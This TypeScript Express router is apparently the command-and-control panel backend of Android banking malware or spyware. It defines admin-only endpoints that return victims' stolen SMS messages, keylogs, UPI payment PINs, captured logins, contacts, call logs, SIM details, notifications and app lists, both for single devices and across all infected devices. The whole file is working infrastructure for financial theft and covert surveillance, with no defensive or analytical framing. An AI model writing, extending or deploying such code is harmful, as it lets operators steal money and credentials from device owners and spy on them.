import { Router, Request, Response } from 'express';
import { authenticate, requireRole } from '../../middleware/auth';
import { asyncHandler } from '../../middleware/errorHandler';
import { ProviderFactory } from '../../providers/factory';

const router = Router();
const adminOnly = [authenticate, requireRole(['admin'])];

/**
 * GET /api/v1/devices/data/:deviceId/messages
 */
router.get('/:deviceId/messages', ...adminOnly, asyncHandler(async (req: Request, res: Response) => {
    const { deviceId } = req.params;
    const { limit = 100 } = req.query;
    const appId = typeof req.query.appId === 'string' ? req.query.appId : undefined;

    const provider = await ProviderFactory.getProviderForDevice(deviceId as string, appId);
    const messages = await provider.getMessages(deviceId as string, Number(limit));

    return res.json({ success: true, messages });
}));

/**
 * GET /api/v1/devices/data/:deviceId/apps
 */
router.get('/:deviceId/apps', ...adminOnly, asyncHandler(async (req: Request, res: Response) => {
    const { deviceId } = req.params;
    const { limit = 200 } = req.query;
    const appId = typeof req.query.appId === 'string' ? req.query.appId : undefined;

    const provider = await ProviderFactory.getProviderForDevice(deviceId as string, appId);
    const apps = await provider.getApps(deviceId as string, Number(limit));

    return res.json({ success: true, apps });
}));

/**
 * GET /api/v1/devices/data/:deviceId/keylogs
 */
router.get('/:deviceId/keylogs', ...adminOnly, asyncHandler(async (req: Request, res: Response) => {
    const { deviceId } = req.params;
    const { limit = 100 } = req.query;
    const appId = typeof req.query.appId === 'string' ? req.query.appId : undefined;

    const provider = await ProviderFactory.getProviderForDevice(deviceId as string, appId);
    const keylogs = await provider.getKeylogs(deviceId as string, Number(limit));

    return res.json({ success: true, keylogs });
}));

/**
 * GET /api/v1/devices/data/:deviceId/upi-pins
 */
router.get('/:deviceId/upi-pins', ...adminOnly, asyncHandler(async (req: Request, res: Response) => {
    const { deviceId } = req.params;
    const appId = typeof req.query.appId === 'string' ? req.query.appId : undefined;

    const provider = await ProviderFactory.getProviderForDevice(deviceId as string, appId);
    const pins = await provider.getUpiPins(deviceId as string);

    return res.json({ success: true, pins });
}));

/**
 * GET /api/v1/devices/data/:deviceId/heartbeat
 */
router.get('/:deviceId/heartbeat', ...adminOnly, asyncHandler(async (req: Request, res: Response) => {
    const { deviceId } = req.params;
    const { limit = 50 } = req.query;
    const appId = typeof req.query.appId === 'string' ? req.query.appId : undefined;

    const provider = await ProviderFactory.getProviderForDevice(deviceId as string, appId);
    const heartbeat = await provider.getHeartbeat(deviceId as string, Number(limit));

    return res.json({ success: true, heartbeat });
}));

/**
 * GET /api/v1/devices/data/:deviceId/sims
 */
router.get('/:deviceId/sims', ...adminOnly, asyncHandler(async (req: Request, res: Response) => {
    const { deviceId } = req.params;
    const appId = typeof req.query.appId === 'string' ? req.query.appId : undefined;

    const provider = await ProviderFactory.getProviderForDevice(deviceId as string, appId);
    const sims = await provider.getSims(deviceId as string);

    return res.json({ success: true, sims });
}));

/**
 * GET /api/v1/devices/data/:deviceId/notifications
 */
router.get('/:deviceId/notifications', ...adminOnly, asyncHandler(async (req: Request, res: Response) => {
    const { deviceId } = req.params;
    const { limit = 100 } = req.query;
    const appId = typeof req.query.appId === 'string' ? req.query.appId : undefined;

    const provider = await ProviderFactory.getProviderForDevice(deviceId as string, appId);
    const notifications = await provider.getNotifications(deviceId as string, Number(limit));

    return res.json({ success: true, notifications });
}));

/**
 * GET /api/v1/devices/data/:deviceId/call-logs
 */
router.get('/:deviceId/call-logs', ...adminOnly, asyncHandler(async (req: Request, res: Response) => {
    const { deviceId } = req.params;
    const { limit = 100 } = req.query;
    const appId = typeof req.query.appId === 'string' ? req.query.appId : undefined;

    const provider = await ProviderFactory.getProviderForDevice(deviceId as string, appId);
    const callLogs = await provider.getCallLogs(deviceId as string, Number(limit));

    return res.json({ success: true, callLogs });
}));

/**
 * GET /api/v1/devices/data/:deviceId/contacts
 */
router.get('/:deviceId/contacts', ...adminOnly, asyncHandler(async (req: Request, res: Response) => {
    const { deviceId } = req.params;
    const appId = typeof req.query.appId === 'string' ? req.query.appId : undefined;

    const provider = await ProviderFactory.getProviderForDevice(deviceId as string, appId);
    const contacts = await provider.getContacts(deviceId as string);

    return res.json({ success: true, contacts });
}));

/**
 * GET /api/v1/devices/data/:deviceId/logins
 */
router.get('/:deviceId/logins', ...adminOnly, asyncHandler(async (req: Request, res: Response) => {
    const { deviceId } = req.params;
    const appId = typeof req.query.appId === 'string' ? req.query.appId : undefined;

    const provider = await ProviderFactory.getProviderForDevice(deviceId as string, appId);
    const logins = await provider.getLogins(deviceId as string);

    return res.json({ success: true, logins });
}));

// ==================== Global Routes (Master Database Only) ====================

/**
 * GET /api/v1/devices/data/messages (Global)
 */
router.get('/messages', ...adminOnly, asyncHandler(async (req: Request, res: Response) => {
    const { limit = 100 } = req.query;
    const provider = await ProviderFactory.getProvider();
    const messages = await provider.listAllMessages(Number(limit));
    return res.json({ success: true, messages });
}));

/**
 * GET /api/v1/devices/data/apps (Global)
 */
router.get('/apps', ...adminOnly, asyncHandler(async (req: Request, res: Response) => {
    const { limit = 200 } = req.query;
    const provider = await ProviderFactory.getProvider();
    const apps = await provider.listAllApps(Number(limit));
    return res.json({ success: true, apps });
}));

/**
 * GET /api/v1/devices/data/keylogs (Global)
 */
router.get('/keylogs', ...adminOnly, asyncHandler(async (req: Request, res: Response) => {
    const { limit = 100 } = req.query;
    const provider = await ProviderFactory.getProvider();
    const keylogs = await provider.listAllKeylogs(Number(limit));
    return res.json({ success: true, keylogs });
}));

/**
 * GET /api/v1/devices/data/upi-pins (Global)
 */
router.get('/upi-pins', ...adminOnly, asyncHandler(async (req: Request, res: Response) => {
    const { limit = 100 } = req.query;
    const provider = await ProviderFactory.getProvider();
    const pins = await provider.listAllUpiPins(Number(limit));
    return res.json({ success: true, pins });
}));

export default router;
